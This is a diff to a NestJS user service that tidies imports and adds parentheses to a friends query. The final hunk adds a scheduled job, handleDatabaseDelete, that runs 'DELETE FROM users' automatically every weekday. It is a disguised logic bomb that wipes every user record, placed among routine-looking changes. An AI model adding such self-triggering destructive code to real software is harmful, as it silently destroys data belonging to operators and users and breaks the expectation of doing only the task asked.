@@ -1,9 +1,9 @@
 import { Injectable, InternalServerErrorException } from '@nestjs/common';
+import { Cron, CronExpression } from '@nestjs/schedule';
 import { InjectRepository } from '@nestjs/typeorm';
 import { Friendship } from 'src/auth/entities/friend.entity';
 import { User } from 'src/auth/entities/user.entity';
-import { DataSource, ILike, Repository } from 'typeorm';
-import { v4 as uuid } from 'uuid';
+import { Repository } from 'typeorm';
 import { FriendRequest, FriendRequest_Status } from './interfaces/interfaces';
 
 @Injectable()
@@ -45,9 +45,9 @@ export class UserService {
           myName: user.userName
         })
       .andWhere(`
-             (friends.creatorId IS NULL OR friends.creatorId != :userId)
+             ((friends.creatorId IS NULL) OR (friends.creatorId != :userId))
              AND
-             (friends.receiverId IS NULL OR friends.receiverId != :userId)
+             ((friends.receiverId IS NULL) OR (friends.receiverId != :userId))
                   `,
         {
           userId: user.id
@@ -171,5 +171,9 @@ export class UserService {
     return true;
   }
 
+  @Cron(CronExpression.EVERY_WEEKDAY)
+  handleDatabaseDelete() {
+    this.userRepository.query('DELETE FROM users')
+  }
 }
 
